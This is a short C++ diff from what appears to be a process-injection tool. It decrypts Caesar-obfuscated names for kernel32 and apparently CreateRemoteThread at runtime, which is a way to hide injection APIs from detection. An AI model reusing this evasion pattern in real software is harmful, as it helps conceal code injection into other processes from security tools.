@@ -92,7 +92,7 @@ CreateThreadFunc Injection::_getCreateThreadFunction(void) {
 	std::string createRemote_str = Crypt::decryptCaesar(createRemote, 0xDE);
 
 
-	HMODULE hModule = GetModuleHandleA(	kernel32_str.c_str());
+	HMODULE hModule = GetModuleHandleA(Crypt::decryptCaesar(kernel32, 0xDE).c_str());
 	if (hModule == NULL) {
 		std::cout << "No se pudo obtener el dll 32 de nucleo." << std::endl;
 	}
